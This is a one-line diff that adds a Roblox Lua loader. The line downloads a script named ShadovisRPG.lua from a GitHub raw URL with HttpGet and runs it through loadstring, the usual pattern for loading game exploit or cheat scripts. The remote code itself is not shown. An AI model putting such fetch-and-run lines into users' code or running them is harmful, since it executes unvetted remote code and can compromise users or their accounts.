@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/BruhSoundEffect2081/BruhScripts/main/ShadovisRPG.lua'))()
